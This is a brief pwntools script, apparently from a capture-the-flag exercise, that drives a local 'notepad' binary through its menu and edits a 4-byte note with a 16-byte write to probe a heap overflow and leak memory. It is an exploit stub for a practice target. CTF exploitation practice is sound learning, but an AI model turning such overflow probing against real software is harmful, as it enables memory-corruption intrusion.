from pwn import *
context.log_level = 'debug'

p=process('./notepad')

def new(data,size):
	p.sendlineafter(">> ",'1')
	p.sendlineafter("Size: ",str(size))
	p.sendlineafter("Data: \n",data)
def edit(idx,data,size):
	p.sendlineafter(">> ",'2')
	p.sendlineafter("Index: ",str(idx))
	p.sendlineafter("Size: ",str(size))
	p.sendlineafter("Data: ",data)
def prin(idx):
	p.sendlineafter(">> ",'3')
	p.sendlineafter("Index: ",str(idx))
new('123',4)#0
new('123',4)#1
edit(0,'1'*7,16)
prin(0)
p.interactive()
